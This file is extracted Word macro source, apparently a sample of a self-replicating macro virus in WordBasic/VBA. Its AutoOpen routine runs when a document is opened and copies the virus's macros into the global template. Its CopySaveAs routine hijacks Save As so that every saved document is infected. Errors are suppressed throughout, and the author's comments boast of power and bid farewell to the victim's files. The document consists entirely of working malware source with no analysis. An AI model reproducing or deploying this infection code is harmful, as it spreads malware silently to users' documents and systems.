   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "CopySaveAs"

   Public Sub MAIN()
   Dim Who$
   Rem /////////////////////////////////
   Rem /Made in Jakutsk by me          /
   Rem /That's engoy to prove my power /
   Rem /Say by to you files            /
   Rem /              :)               /
   Rem /////////////////////////////////
   On Error GoTo -1: On Error GoTo lll
   Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
   WordBasic.CurValues.FileSaveAs dlg
   WordBasic.Dialog.FileSaveAs dlg
   If dlg.Format = 0 Then dlg.Format = 1
   Who$ = WordBasic.[FileNameInfo$](WordBasic.[FileName$](), 4)
   WordBasic.MacroCopy "FileSaveAs", Who$ + ":CopySaveAs"
   WordBasic.MacroCopy "CopyOpen", Who$ + ":aUTOOpen"
   WordBasic.FileSaveAs dlg
   lll:
   End Sub

   Attribute VB_Name = "aUTOOpen"

   Public Sub MAIN()
   Dim Who$
   Rem /////////////////////////////////
   Rem /Made in Jakutsk by me          /
   Rem /That's engoy to prove my power /
   Rem /Say by to you files            /
   Rem /              :)               /
   Rem /////////////////////////////////
   Who$ = WordBasic.[FileNameInfo$](WordBasic.[FileName$](), 4)
   WordBasic.MacroCopy Who$ + ":CopySaveAs", "FileSaveAs"
   WordBasic.MacroCopy Who$ + ":aUTOOpen", "CopyOpen"
   End Sub
